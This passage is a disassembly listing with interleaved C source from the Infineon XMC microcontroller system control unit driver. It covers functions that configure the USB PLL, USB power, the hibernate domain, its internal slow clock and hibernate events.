 8001afc:	ed9f 7a06 	vldr	s14, [pc, #24]	; 8001b18 <XMC_SCU_POWER_GetEVR33Voltage+0x30>
 8001b00:	ee67 7a87 	vmul.f32	s15, s15, s14
 8001b04:	ee17 3a90 	vmov	r3, s15
}
 8001b08:	4618      	mov	r0, r3
 8001b0a:	46bd      	mov	sp, r7
 8001b0c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001b10:	4770      	bx	lr
 8001b12:	bf00      	nop
 8001b14:	50004200 	.word	0x50004200
 8001b18:	3cb851ec 	.word	0x3cb851ec

08001b1c <XMC_SCU_CLOCK_EnableUsbPll>:

/* API to enable USB PLL for USB clock */
void XMC_SCU_CLOCK_EnableUsbPll(void)
{
 8001b1c:	b480      	push	{r7}
 8001b1e:	af00      	add	r7, sp, #0
  SCU_PLL->USBPLLCON &= (uint32_t)~(SCU_PLL_USBPLLCON_VCOPWD_Msk | SCU_PLL_USBPLLCON_PLLPWD_Msk);
 8001b20:	4b06      	ldr	r3, [pc, #24]	; (8001b3c <XMC_SCU_CLOCK_EnableUsbPll+0x20>)
 8001b22:	695b      	ldr	r3, [r3, #20]
 8001b24:	4a05      	ldr	r2, [pc, #20]	; (8001b3c <XMC_SCU_CLOCK_EnableUsbPll+0x20>)
 8001b26:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8001b2a:	f023 0302 	bic.w	r3, r3, #2
 8001b2e:	6153      	str	r3, [r2, #20]
}
 8001b30:	bf00      	nop
 8001b32:	46bd      	mov	sp, r7
 8001b34:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001b38:	4770      	bx	lr
 8001b3a:	bf00      	nop
 8001b3c:	50004710 	.word	0x50004710

08001b40 <XMC_SCU_CLOCK_DisableUsbPll>:

/* API to disable USB PLL for USB clock */
void XMC_SCU_CLOCK_DisableUsbPll(void)
{
 8001b40:	b480      	push	{r7}
 8001b42:	af00      	add	r7, sp, #0
  SCU_PLL->USBPLLCON |= (uint32_t)(SCU_PLL_USBPLLCON_VCOPWD_Msk | SCU_PLL_USBPLLCON_PLLPWD_Msk);
 8001b44:	4b06      	ldr	r3, [pc, #24]	; (8001b60 <XMC_SCU_CLOCK_DisableUsbPll+0x20>)
 8001b46:	695b      	ldr	r3, [r3, #20]
 8001b48:	4a05      	ldr	r2, [pc, #20]	; (8001b60 <XMC_SCU_CLOCK_DisableUsbPll+0x20>)
 8001b4a:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8001b4e:	f043 0302 	orr.w	r3, r3, #2
 8001b52:	6153      	str	r3, [r2, #20]
}
 8001b54:	bf00      	nop
 8001b56:	46bd      	mov	sp, r7
 8001b58:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001b5c:	4770      	bx	lr
 8001b5e:	bf00      	nop
 8001b60:	50004710 	.word	0x50004710

08001b64 <XMC_SCU_CLOCK_StartUsbPll>:

/* API to configure USB PLL */
void XMC_SCU_CLOCK_StartUsbPll(uint32_t pdiv, uint32_t ndiv)
{
 8001b64:	b480      	push	{r7}
 8001b66:	b083      	sub	sp, #12
 8001b68:	af00      	add	r7, sp, #0
 8001b6a:	6078      	str	r0, [r7, #4]
 8001b6c:	6039      	str	r1, [r7, #0]
  /* Go to bypass the USB PLL */
  SCU_PLL->USBPLLCON |= (uint32_t)SCU_PLL_USBPLLCON_VCOBYP_Msk;
 8001b6e:	4b1a      	ldr	r3, [pc, #104]	; (8001bd8 <XMC_SCU_CLOCK_StartUsbPll+0x74>)
 8001b70:	695b      	ldr	r3, [r3, #20]
 8001b72:	4a19      	ldr	r2, [pc, #100]	; (8001bd8 <XMC_SCU_CLOCK_StartUsbPll+0x74>)
 8001b74:	f043 0301 	orr.w	r3, r3, #1
 8001b78:	6153      	str	r3, [r2, #20]

  /* disconnect Oscillator from USB PLL */
  SCU_PLL->USBPLLCON |= (uint32_t)SCU_PLL_USBPLLCON_FINDIS_Msk;
 8001b7a:	4b17      	ldr	r3, [pc, #92]	; (8001bd8 <XMC_SCU_CLOCK_StartUsbPll+0x74>)
 8001b7c:	695b      	ldr	r3, [r3, #20]
 8001b7e:	4a16      	ldr	r2, [pc, #88]	; (8001bd8 <XMC_SCU_CLOCK_StartUsbPll+0x74>)
 8001b80:	f043 0310 	orr.w	r3, r3, #16
 8001b84:	6153      	str	r3, [r2, #20]

  /* Setup Divider settings for USB PLL */
  SCU_PLL->USBPLLCON = (uint32_t)((uint32_t)((ndiv -1U) << SCU_PLL_USBPLLCON_NDIV_Pos) |
 8001b86:	683b      	ldr	r3, [r7, #0]
 8001b88:	3b01      	subs	r3, #1
 8001b8a:	021a      	lsls	r2, r3, #8
                       (uint32_t)((pdiv - 1U) << SCU_PLL_USBPLLCON_PDIV_Pos));
 8001b8c:	687b      	ldr	r3, [r7, #4]
 8001b8e:	3b01      	subs	r3, #1
 8001b90:	061b      	lsls	r3, r3, #24
  SCU_PLL->USBPLLCON = (uint32_t)((uint32_t)((ndiv -1U) << SCU_PLL_USBPLLCON_NDIV_Pos) |
 8001b92:	4911      	ldr	r1, [pc, #68]	; (8001bd8 <XMC_SCU_CLOCK_StartUsbPll+0x74>)
 8001b94:	4313      	orrs	r3, r2
 8001b96:	614b      	str	r3, [r1, #20]

  /* Set OSCDISCDIS */
  SCU_PLL->USBPLLCON |= (uint32_t)SCU_PLL_USBPLLCON_OSCDISCDIS_Msk;
 8001b98:	4b0f      	ldr	r3, [pc, #60]	; (8001bd8 <XMC_SCU_CLOCK_StartUsbPll+0x74>)
 8001b9a:	695b      	ldr	r3, [r3, #20]
 8001b9c:	4a0e      	ldr	r2, [pc, #56]	; (8001bd8 <XMC_SCU_CLOCK_StartUsbPll+0x74>)
 8001b9e:	f043 0340 	orr.w	r3, r3, #64	; 0x40
 8001ba2:	6153      	str	r3, [r2, #20]

  /* connect Oscillator to USB PLL */
  SCU_PLL->USBPLLCON &= (uint32_t)~SCU_PLL_USBPLLCON_FINDIS_Msk;
 8001ba4:	4b0c      	ldr	r3, [pc, #48]	; (8001bd8 <XMC_SCU_CLOCK_StartUsbPll+0x74>)
 8001ba6:	695b      	ldr	r3, [r3, #20]
 8001ba8:	4a0b      	ldr	r2, [pc, #44]	; (8001bd8 <XMC_SCU_CLOCK_StartUsbPll+0x74>)
 8001baa:	f023 0310 	bic.w	r3, r3, #16
 8001bae:	6153      	str	r3, [r2, #20]

  /* restart PLL Lock detection */
  SCU_PLL->USBPLLCON |= (uint32_t)SCU_PLL_USBPLLCON_RESLD_Msk;
 8001bb0:	4b09      	ldr	r3, [pc, #36]	; (8001bd8 <XMC_SCU_CLOCK_StartUsbPll+0x74>)
 8001bb2:	695b      	ldr	r3, [r3, #20]
 8001bb4:	4a08      	ldr	r2, [pc, #32]	; (8001bd8 <XMC_SCU_CLOCK_StartUsbPll+0x74>)
 8001bb6:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 8001bba:	6153      	str	r3, [r2, #20]

  while ((SCU_PLL->USBPLLSTAT & SCU_PLL_USBPLLSTAT_VCOLOCK_Msk) == 0U)
 8001bbc:	bf00      	nop
 8001bbe:	4b06      	ldr	r3, [pc, #24]	; (8001bd8 <XMC_SCU_CLOCK_StartUsbPll+0x74>)
 8001bc0:	691b      	ldr	r3, [r3, #16]
 8001bc2:	f003 0304 	and.w	r3, r3, #4
 8001bc6:	2b00      	cmp	r3, #0
 8001bc8:	d0f9      	beq.n	8001bbe <XMC_SCU_CLOCK_StartUsbPll+0x5a>
  {
    /* wait for PLL Lock */
  }

}
 8001bca:	bf00      	nop
 8001bcc:	bf00      	nop
 8001bce:	370c      	adds	r7, #12
 8001bd0:	46bd      	mov	sp, r7
 8001bd2:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001bd6:	4770      	bx	lr
 8001bd8:	50004710 	.word	0x50004710

08001bdc <XMC_SCU_CLOCK_StopUsbPll>:

/* API to disable USB PLL operation */
void XMC_SCU_CLOCK_StopUsbPll(void)
{
 8001bdc:	b480      	push	{r7}
 8001bde:	af00      	add	r7, sp, #0
  SCU_PLL->USBPLLCON = (uint32_t)(SCU_PLL_USBPLLCON_VCOPWD_Msk | SCU_PLL_USBPLLCON_PLLPWD_Msk |
 8001be0:	4b03      	ldr	r3, [pc, #12]	; (8001bf0 <XMC_SCU_CLOCK_StopUsbPll+0x14>)
 8001be2:	4a04      	ldr	r2, [pc, #16]	; (8001bf4 <XMC_SCU_CLOCK_StopUsbPll+0x18>)
 8001be4:	615a      	str	r2, [r3, #20]
                                  SCU_PLL_USBPLLCON_VCOBYP_Msk);
}
 8001be6:	bf00      	nop
 8001be8:	46bd      	mov	sp, r7
 8001bea:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001bee:	4770      	bx	lr
 8001bf0:	50004710 	.word	0x50004710
 8001bf4:	00010003 	.word	0x00010003

08001bf8 <XMC_SCU_CLOCK_SetBackupClockCalibrationMode>:

/* API to onfigure the calibration mode for internal oscillator */
void XMC_SCU_CLOCK_SetBackupClockCalibrationMode(XMC_SCU_CLOCK_FOFI_CALIBRATION_MODE_t mode)
{
 8001bf8:	b580      	push	{r7, lr}
 8001bfa:	b082      	sub	sp, #8
 8001bfc:	af00      	add	r7, sp, #0
 8001bfe:	4603      	mov	r3, r0
 8001c00:	71fb      	strb	r3, [r7, #7]
  /* Enable factory calibration based trimming */
  SCU_PLL->PLLCON0 |= (uint32_t)SCU_PLL_PLLCON0_FOTR_Msk;
 8001c02:	4b0f      	ldr	r3, [pc, #60]	; (8001c40 <XMC_SCU_CLOCK_SetBackupClockCalibrationMode+0x48>)
 8001c04:	685b      	ldr	r3, [r3, #4]
 8001c06:	4a0e      	ldr	r2, [pc, #56]	; (8001c40 <XMC_SCU_CLOCK_SetBackupClockCalibrationMode+0x48>)
 8001c08:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 8001c0c:	6053      	str	r3, [r2, #4]

  if (mode == XMC_SCU_CLOCK_FOFI_CALIBRATION_MODE_AUTOMATIC)
 8001c0e:	79fb      	ldrb	r3, [r7, #7]
 8001c10:	2b01      	cmp	r3, #1
 8001c12:	d10e      	bne.n	8001c32 <XMC_SCU_CLOCK_SetBackupClockCalibrationMode+0x3a>
  {
    /* Disable factory calibration based trimming */
    SCU_PLL->PLLCON0 &= (uint32_t)~SCU_PLL_PLLCON0_FOTR_Msk;
 8001c14:	4b0a      	ldr	r3, [pc, #40]	; (8001c40 <XMC_SCU_CLOCK_SetBackupClockCalibrationMode+0x48>)
 8001c16:	685b      	ldr	r3, [r3, #4]
 8001c18:	4a09      	ldr	r2, [pc, #36]	; (8001c40 <XMC_SCU_CLOCK_SetBackupClockCalibrationMode+0x48>)
 8001c1a:	f423 1380 	bic.w	r3, r3, #1048576	; 0x100000
 8001c1e:	6053      	str	r3, [r2, #4]
    XMC_SCU_lDelay(100UL);
 8001c20:	2064      	movs	r0, #100	; 0x64
 8001c22:	f7ff f8b9 	bl	8000d98 <XMC_SCU_lDelay>

    /* Enable automatic calibration */
    SCU_PLL->PLLCON0 |= (uint32_t)SCU_PLL_PLLCON0_AOTREN_Msk;
 8001c26:	4b06      	ldr	r3, [pc, #24]	; (8001c40 <XMC_SCU_CLOCK_SetBackupClockCalibrationMode+0x48>)
 8001c28:	685b      	ldr	r3, [r3, #4]
 8001c2a:	4a05      	ldr	r2, [pc, #20]	; (8001c40 <XMC_SCU_CLOCK_SetBackupClockCalibrationMode+0x48>)
 8001c2c:	f443 2300 	orr.w	r3, r3, #524288	; 0x80000
 8001c30:	6053      	str	r3, [r2, #4]
  }

  XMC_SCU_lDelay(100UL);
 8001c32:	2064      	movs	r0, #100	; 0x64
 8001c34:	f7ff f8b0 	bl	8000d98 <XMC_SCU_lDelay>
}
 8001c38:	bf00      	nop
 8001c3a:	3708      	adds	r7, #8
 8001c3c:	46bd      	mov	sp, r7
 8001c3e:	bd80      	pop	{r7, pc}
 8001c40:	50004710 	.word	0x50004710

08001c44 <XMC_SCU_POWER_EnableUsb>:



/* API to enable USB Phy and comparator */
void XMC_SCU_POWER_EnableUsb(void)
{
 8001c44:	b480      	push	{r7}
 8001c46:	af00      	add	r7, sp, #0
#if defined(USB_OTG_SUPPORTED)
  SCU_POWER->PWRSET = (uint32_t)(SCU_POWER_PWRSET_USBOTGEN_Msk | SCU_POWER_PWRSET_USBPHYPDQ_Msk);
 8001c48:	4b04      	ldr	r3, [pc, #16]	; (8001c5c <XMC_SCU_POWER_EnableUsb+0x18>)
 8001c4a:	f44f 3240 	mov.w	r2, #196608	; 0x30000
 8001c4e:	605a      	str	r2, [r3, #4]
#else
  SCU_POWER->PWRSET = (uint32_t)SCU_POWER_PWRSET_USBPHYPDQ_Msk;
#endif
}
 8001c50:	bf00      	nop
 8001c52:	46bd      	mov	sp, r7
 8001c54:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001c58:	4770      	bx	lr
 8001c5a:	bf00      	nop
 8001c5c:	50004200 	.word	0x50004200

08001c60 <XMC_SCU_POWER_DisableUsb>:

/* API to power down USB Phy and comparator */
void XMC_SCU_POWER_DisableUsb(void)
{
 8001c60:	b480      	push	{r7}
 8001c62:	af00      	add	r7, sp, #0
#if defined(USB_OTG_SUPPORTED)
  SCU_POWER->PWRCLR = (uint32_t)(SCU_POWER_PWRCLR_USBOTGEN_Msk | SCU_POWER_PWRSET_USBPHYPDQ_Msk);
 8001c64:	4b04      	ldr	r3, [pc, #16]	; (8001c78 <XMC_SCU_POWER_DisableUsb+0x18>)
 8001c66:	f44f 3240 	mov.w	r2, #196608	; 0x30000
 8001c6a:	609a      	str	r2, [r3, #8]
#else
  SCU_POWER->PWRCLR = (uint32_t)SCU_POWER_PWRCLR_USBPHYPDQ_Msk;
#endif    
}
 8001c6c:	bf00      	nop
 8001c6e:	46bd      	mov	sp, r7
 8001c70:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001c74:	4770      	bx	lr
 8001c76:	bf00      	nop
 8001c78:	50004200 	.word	0x50004200

08001c7c <XMC_SCU_CLOCK_IsUsbPllLocked>:

/* API to check USB PLL is locked or not */
bool XMC_SCU_CLOCK_IsUsbPllLocked(void)
{
 8001c7c:	b480      	push	{r7}
 8001c7e:	af00      	add	r7, sp, #0
  return (bool)((SCU_PLL->USBPLLSTAT & SCU_PLL_USBPLLSTAT_VCOLOCK_Msk) != 0UL);
 8001c80:	4b06      	ldr	r3, [pc, #24]	; (8001c9c <XMC_SCU_CLOCK_IsUsbPllLocked+0x20>)
 8001c82:	691b      	ldr	r3, [r3, #16]
 8001c84:	f003 0304 	and.w	r3, r3, #4
 8001c88:	2b00      	cmp	r3, #0
 8001c8a:	bf14      	ite	ne
 8001c8c:	2301      	movne	r3, #1
 8001c8e:	2300      	moveq	r3, #0
 8001c90:	b2db      	uxtb	r3, r3
}
 8001c92:	4618      	mov	r0, r3
 8001c94:	46bd      	mov	sp, r7
 8001c96:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001c9a:	4770      	bx	lr
 8001c9c:	50004710 	.word	0x50004710

08001ca0 <XMC_SCU_HIB_EnableHibernateDomain>:

/* API to power up the hibernation domain */
void XMC_SCU_HIB_EnableHibernateDomain(void)
{
 8001ca0:	b480      	push	{r7}
 8001ca2:	af00      	add	r7, sp, #0
  /* Power up HIB domain if and only if it is currently powered down */
  if((SCU_POWER->PWRSTAT & SCU_POWER_PWRSTAT_HIBEN_Msk) == 0UL)
 8001ca4:	4b12      	ldr	r3, [pc, #72]	; (8001cf0 <XMC_SCU_HIB_EnableHibernateDomain+0x50>)
 8001ca6:	681b      	ldr	r3, [r3, #0]
 8001ca8:	f003 0301 	and.w	r3, r3, #1
 8001cac:	2b00      	cmp	r3, #0
 8001cae:	d109      	bne.n	8001cc4 <XMC_SCU_HIB_EnableHibernateDomain+0x24>
  {
    SCU_POWER->PWRSET = (uint32_t)SCU_POWER_PWRSET_HIB_Msk;
 8001cb0:	4b0f      	ldr	r3, [pc, #60]	; (8001cf0 <XMC_SCU_HIB_EnableHibernateDomain+0x50>)
 8001cb2:	2201      	movs	r2, #1
 8001cb4:	605a      	str	r2, [r3, #4]
    
    while((SCU_POWER->PWRSTAT & SCU_POWER_PWRSTAT_HIBEN_Msk) == 0UL)
 8001cb6:	bf00      	nop
 8001cb8:	4b0d      	ldr	r3, [pc, #52]	; (8001cf0 <XMC_SCU_HIB_EnableHibernateDomain+0x50>)
 8001cba:	681b      	ldr	r3, [r3, #0]
 8001cbc:	f003 0301 	and.w	r3, r3, #1
 8001cc0:	2b00      	cmp	r3, #0
 8001cc2:	d0f9      	beq.n	8001cb8 <XMC_SCU_HIB_EnableHibernateDomain+0x18>
      /* wait until HIB domain is enabled */
    }    
  }
  
  /* Remove the reset only if HIB domain were in a state of reset */
  if((SCU_RESET->RSTSTAT) & SCU_RESET_RSTSTAT_HIBRS_Msk)
 8001cc4:	4b0b      	ldr	r3, [pc, #44]	; (8001cf4 <XMC_SCU_HIB_EnableHibernateDomain+0x54>)
 8001cc6:	681b      	ldr	r3, [r3, #0]
 8001cc8:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8001ccc:	2b00      	cmp	r3, #0
 8001cce:	d00a      	beq.n	8001ce6 <XMC_SCU_HIB_EnableHibernateDomain+0x46>
  {
    SCU_RESET->RSTCLR = (uint32_t)SCU_RESET_RSTCLR_HIBRS_Msk;
 8001cd0:	4b08      	ldr	r3, [pc, #32]	; (8001cf4 <XMC_SCU_HIB_EnableHibernateDomain+0x54>)
 8001cd2:	f44f 7200 	mov.w	r2, #512	; 0x200
 8001cd6:	609a      	str	r2, [r3, #8]
    while((SCU_RESET->RSTSTAT & SCU_RESET_RSTSTAT_HIBRS_Msk) != 0UL)
 8001cd8:	bf00      	nop
 8001cda:	4b06      	ldr	r3, [pc, #24]	; (8001cf4 <XMC_SCU_HIB_EnableHibernateDomain+0x54>)
 8001cdc:	681b      	ldr	r3, [r3, #0]
 8001cde:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8001ce2:	2b00      	cmp	r3, #0
 8001ce4:	d1f9      	bne.n	8001cda <XMC_SCU_HIB_EnableHibernateDomain+0x3a>
    {
      /* wait until HIB domain is enabled */
    }
  }
}
 8001ce6:	bf00      	nop
 8001ce8:	46bd      	mov	sp, r7
 8001cea:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001cee:	4770      	bx	lr
 8001cf0:	50004200 	.word	0x50004200
 8001cf4:	50004400 	.word	0x50004400

08001cf8 <XMC_SCU_HIB_DisableHibernateDomain>:

/* API to power down the hibernation domain */
void XMC_SCU_HIB_DisableHibernateDomain(void)
{
 8001cf8:	b480      	push	{r7}
 8001cfa:	af00      	add	r7, sp, #0
  /* Disable hibernate domain */   
  SCU_POWER->PWRCLR = (uint32_t)SCU_POWER_PWRCLR_HIB_Msk;
 8001cfc:	4b05      	ldr	r3, [pc, #20]	; (8001d14 <XMC_SCU_HIB_DisableHibernateDomain+0x1c>)
 8001cfe:	2201      	movs	r2, #1
 8001d00:	609a      	str	r2, [r3, #8]
  /* Reset of hibernate domain reset */  
  SCU_RESET->RSTSET = (uint32_t)SCU_RESET_RSTSET_HIBRS_Msk;
 8001d02:	4b05      	ldr	r3, [pc, #20]	; (8001d18 <XMC_SCU_HIB_DisableHibernateDomain+0x20>)
 8001d04:	f44f 7200 	mov.w	r2, #512	; 0x200
 8001d08:	605a      	str	r2, [r3, #4]
}
 8001d0a:	bf00      	nop
 8001d0c:	46bd      	mov	sp, r7
 8001d0e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001d12:	4770      	bx	lr
 8001d14:	50004200 	.word	0x50004200
 8001d18:	50004400 	.word	0x50004400

08001d1c <XMC_SCU_HIB_IsHibernateDomainEnabled>:

/* API to check the hibernation domain is enabled or not */
bool XMC_SCU_HIB_IsHibernateDomainEnabled(void)
{
 8001d1c:	b480      	push	{r7}
 8001d1e:	af00      	add	r7, sp, #0
  return ((bool)(SCU_POWER->PWRSTAT & SCU_POWER_PWRSTAT_HIBEN_Msk) && 
 8001d20:	4b0b      	ldr	r3, [pc, #44]	; (8001d50 <XMC_SCU_HIB_IsHibernateDomainEnabled+0x34>)
 8001d22:	681b      	ldr	r3, [r3, #0]
 8001d24:	f003 0301 	and.w	r3, r3, #1
 8001d28:	2b00      	cmp	r3, #0
 8001d2a:	d007      	beq.n	8001d3c <XMC_SCU_HIB_IsHibernateDomainEnabled+0x20>
          !(bool)(SCU_RESET->RSTSTAT & SCU_RESET_RSTSTAT_HIBRS_Msk));
 8001d2c:	4b09      	ldr	r3, [pc, #36]	; (8001d54 <XMC_SCU_HIB_IsHibernateDomainEnabled+0x38>)
 8001d2e:	681b      	ldr	r3, [r3, #0]
 8001d30:	f403 7300 	and.w	r3, r3, #512	; 0x200
  return ((bool)(SCU_POWER->PWRSTAT & SCU_POWER_PWRSTAT_HIBEN_Msk) && 
 8001d34:	2b00      	cmp	r3, #0
 8001d36:	d101      	bne.n	8001d3c <XMC_SCU_HIB_IsHibernateDomainEnabled+0x20>
 8001d38:	2301      	movs	r3, #1
 8001d3a:	e000      	b.n	8001d3e <XMC_SCU_HIB_IsHibernateDomainEnabled+0x22>
 8001d3c:	2300      	movs	r3, #0
 8001d3e:	f003 0301 	and.w	r3, r3, #1
 8001d42:	b2db      	uxtb	r3, r3
}
 8001d44:	4618      	mov	r0, r3
 8001d46:	46bd      	mov	sp, r7
 8001d48:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001d4c:	4770      	bx	lr
 8001d4e:	bf00      	nop
 8001d50:	50004200 	.word	0x50004200
 8001d54:	50004400 	.word	0x50004400

08001d58 <XMC_SCU_HIB_EnableInternalSlowClock>:

/* API to enable internal slow clock - fOSI (32.768kHz) in hibernate domain */
void XMC_SCU_HIB_EnableInternalSlowClock(void)
{
 8001d58:	b480      	push	{r7}
 8001d5a:	af00      	add	r7, sp, #0
  while((SCU_GENERAL->MIRRSTS) & SCU_GENERAL_MIRRSTS_OSCSICTRL_Msk)
 8001d5c:	bf00      	nop
 8001d5e:	4b09      	ldr	r3, [pc, #36]	; (8001d84 <XMC_SCU_HIB_EnableInternalSlowClock+0x2c>)
 8001d60:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 8001d64:	f003 0320 	and.w	r3, r3, #32
 8001d68:	2b00      	cmp	r3, #0
 8001d6a:	d1f8      	bne.n	8001d5e <XMC_SCU_HIB_EnableInternalSlowClock+0x6>
  {
    /* Wait until OSCSICTRL register in hibernate domain is ready to accept a write */  
  }
  SCU_HIBERNATE->OSCSICTRL &= (uint32_t)~(SCU_HIBERNATE_OSCSICTRL_PWD_Msk);
 8001d6c:	4b06      	ldr	r3, [pc, #24]	; (8001d88 <XMC_SCU_HIB_EnableInternalSlowClock+0x30>)
 8001d6e:	695b      	ldr	r3, [r3, #20]
 8001d70:	4a05      	ldr	r2, [pc, #20]	; (8001d88 <XMC_SCU_HIB_EnableInternalSlowClock+0x30>)
 8001d72:	f023 0301 	bic.w	r3, r3, #1
 8001d76:	6153      	str	r3, [r2, #20]
}
 8001d78:	bf00      	nop
 8001d7a:	46bd      	mov	sp, r7
 8001d7c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001d80:	4770      	bx	lr
 8001d82:	bf00      	nop
 8001d84:	50004000 	.word	0x50004000
 8001d88:	50004300 	.word	0x50004300

08001d8c <XMC_SCU_HIB_DisableInternalSlowClock>:

/* API to disable internal slow clock - fOSI (32.768kHz) in hibernate domain */
void XMC_SCU_HIB_DisableInternalSlowClock(void)
{
 8001d8c:	b480      	push	{r7}
 8001d8e:	af00      	add	r7, sp, #0
  while((SCU_GENERAL->MIRRSTS) & SCU_GENERAL_MIRRSTS_OSCSICTRL_Msk)
 8001d90:	bf00      	nop
 8001d92:	4b09      	ldr	r3, [pc, #36]	; (8001db8 <XMC_SCU_HIB_DisableInternalSlowClock+0x2c>)
 8001d94:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 8001d98:	f003 0320 	and.w	r3, r3, #32
 8001d9c:	2b00      	cmp	r3, #0
 8001d9e:	d1f8      	bne.n	8001d92 <XMC_SCU_HIB_DisableInternalSlowClock+0x6>
  {
    /* Wait until OSCSICTRL register in hibernate domain is ready to accept a write */  
  }
  SCU_HIBERNATE->OSCSICTRL |= (uint32_t)SCU_HIBERNATE_OSCSICTRL_PWD_Msk;
 8001da0:	4b06      	ldr	r3, [pc, #24]	; (8001dbc <XMC_SCU_HIB_DisableInternalSlowClock+0x30>)
 8001da2:	695b      	ldr	r3, [r3, #20]
 8001da4:	4a05      	ldr	r2, [pc, #20]	; (8001dbc <XMC_SCU_HIB_DisableInternalSlowClock+0x30>)
 8001da6:	f043 0301 	orr.w	r3, r3, #1
 8001daa:	6153      	str	r3, [r2, #20]
}
 8001dac:	bf00      	nop
 8001dae:	46bd      	mov	sp, r7
 8001db0:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001db4:	4770      	bx	lr
 8001db6:	bf00      	nop
 8001db8:	50004000 	.word	0x50004000
 8001dbc:	50004300 	.word	0x50004300

08001dc0 <XMC_SCU_HIB_ClearEventStatus>:

void XMC_SCU_HIB_ClearEventStatus(int32_t event)
{
 8001dc0:	b480      	push	{r7}
 8001dc2:	b083      	sub	sp, #12
 8001dc4:	af00      	add	r7, sp, #0
 8001dc6:	6078      	str	r0, [r7, #4]
  while((SCU_GENERAL->MIRRSTS) & SCU_GENERAL_MIRRSTS_HDCLR_Msk)
 8001dc8:	bf00      	nop
 8001dca:	4b08      	ldr	r3, [pc, #32]	; (8001dec <XMC_SCU_HIB_ClearEventStatus+0x2c>)
 8001dcc:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 8001dd0:	f003 0302 	and.w	r3, r3, #2
 8001dd4:	2b00      	cmp	r3, #0
 8001dd6:	d1f8      	bne.n	8001dca <XMC_SCU_HIB_ClearEventStatus+0xa>
  {
    /* Wait until HDCLR register in hibernate domain is ready to accept a write */  
  }
  SCU_HIBERNATE->HDCLR = event;
 8001dd8:	4a05      	ldr	r2, [pc, #20]	; (8001df0 <XMC_SCU_HIB_ClearEventStatus+0x30>)
 8001dda:	687b      	ldr	r3, [r7, #4]
 8001ddc:	6053      	str	r3, [r2, #4]
}
 8001dde:	bf00      	nop
 8001de0:	370c      	adds	r7, #12
 8001de2:	46bd      	mov	sp, r7
 8001de4:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001de8:	4770      	bx	lr
 8001dea:	bf00      	nop
 8001dec:	50004000 	.word	0x50004000
 8001df0:	50004300 	.word	0x50004300

08001df4 <XMC_SCU_HIB_TriggerEvent>:

void XMC_SCU_HIB_TriggerEvent(int32_t event)
{
 8001df4:	b480      	push	{r7}
 8001df6:	b083      	sub	sp, #12
 8001df8:	af00      	add	r7, sp, #0
 8001dfa:	6078      	str	r0, [r7, #4]
  while((SCU_GENERAL->MIRRSTS) & SCU_GENERAL_MIRRSTS_HDSET_Msk)
 8001dfc:	bf00      	nop
 8001dfe:	4b08      	ldr	r3, [pc, #32]	; (8001e20 <XMC_SCU_HIB_TriggerEvent+0x2c>)
 8001e00:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 8001e04:	f003 0304 	and.w	r3, r3, #4
 8001e08:	2b00      	cmp	r3, #0
 8001e0a:	d1f8      	bne.n	8001dfe <XMC_SCU_HIB_TriggerEvent+0xa>
  {
    /* Wait until HDSET register in hibernate domain is ready to accept a write */    
  }
  SCU_HIBERNATE->HDSET = event;
 8001e0c:	4a05      	ldr	r2, [pc, #20]	; (8001e24 <XMC_SCU_HIB_TriggerEvent+0x30>)
 8001e0e:	687b      	ldr	r3, [r7, #4]
 8001e10:	6093      	str	r3, [r2, #8]
}
 8001e12:	bf00      	nop
 8001e14:	370c      	adds	r7, #12
 8001e16:	46bd      	mov	sp, r7
 8001e18:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001e1c:	4770      	bx	lr
 8001e1e:	bf00      	nop
 8001e20:	50004000 	.word	0x50004000
 8001e24:	50004300 	.word	0x50004300

08001e28 <XMC_SCU_HIB_EnableEvent>:

void XMC_SCU_HIB_EnableEvent(int32_t event)
{
 8001e28:	b480      	push	{r7}
 8001e2a:	b083      	sub	sp, #12
 8001e2c:	af00      	add	r7, sp, #0
 8001e2e:	6078      	str	r0, [r7, #4]
  event = ((event & XMC_SCU_HIB_EVENT_LPAC_HIB_IO_1_POSEDGE) << (SCU_HIBERNATE_HDCR_AHIBIO1HI_Pos - SCU_HIBERNATE_HDSTAT_AHIBIO1PEV_Pos)) | (event & (uint32_t)~XMC_SCU_HIB_EVENT_LPAC_HIB_IO_1_POSEDGE);
  event = ((event & XMC_SCU_HIB_EVENT_LPAC_HIB_IO_1_NEGEDGE) << (SCU_HIBERNATE_HDCR_AHIBIO1LO_Pos - SCU_HIBERNATE_HDSTAT_AHIBIO1NEV_Pos)) | (event & (uint32_t)~XMC_SCU_HIB_EVENT_LPAC_HIB_IO_1_NEGEDGE);
#endif
#endif

  while((SCU_GENERAL->MIRRSTS) & SCU_GENERAL_MIRRSTS_HDCR_Msk)
 8001e30:	bf00      	nop
 8001e32:	4b09      	ldr	r3, [pc, #36]	; (8001e58 <XMC_SCU_HIB_EnableEvent+0x30>)
 8001e34:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 8001e38:	f003 0308 	and.w	r3, r3, #8
 8001e3c:	2b00      	cmp	r3, #0
 8001e3e:	d1f8      	bne.n	8001e32 <XMC_SCU_HIB_EnableEvent+0xa>
  {
    /* Wait until HDCR register in hibernate domain is ready to accept a write */    
  }
  SCU_HIBERNATE->HDCR |= event;
 8001e40:	4b06      	ldr	r3, [pc, #24]	; (8001e5c <XMC_SCU_HIB_EnableEvent+0x34>)
